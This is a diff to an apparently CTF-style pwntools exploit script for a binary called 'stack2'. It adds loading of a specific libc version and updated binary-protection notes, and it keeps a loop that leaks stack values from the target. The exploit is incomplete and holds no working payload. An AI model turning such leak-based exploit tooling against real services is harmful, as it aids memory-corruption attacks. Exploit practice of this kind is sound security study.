@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template stack2
+# $ pwn template --libc libc-2.31.so stack2
 from pwn import *
 
 # Set up pwntools for the correct architecture
@@ -11,6 +11,19 @@ exe = context.binary = ELF(args.EXE or 'stack2')
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
+
+# Use the specified remote libc version unless explicitly told to use the
+# local system version with the `LOCAL_LIBC` argument.
+# ./exploit.py LOCAL LOCAL_LIBC
+if args.LOCAL_LIBC:
+    libc = exe.libc
+else:
+    library_path = libcdb.download_libraries('libc-2.31.so')
+    if library_path:
+        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
+        libc = exe.libc
+    else:
+        libc = ELF('libc-2.31.so')
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
@@ -31,11 +44,12 @@ continue
 #                    EXPLOIT GOES HERE
 #===========================================================
 # Arch:     amd64-64-little
-# RELRO:      Partial RELRO
-# Stack:      No canary found
+# RELRO:      Full RELRO
+# Stack:      Canary found
 # NX:         NX enabled
 # PIE:        PIE enabled
 # Stripped:   No
+# Debuginfo:  Yes
 
 def get_stack_var(io: process | connect, index: int) -> int:
     io.recvuntil(b"something: ")
@@ -51,7 +65,6 @@ for i in range(1, 20):
     io.info(f"Leaked the {i}th stack var: {hex(leak)}.")
 
 # address of the global flag var
-
 
 io.interactive()
 
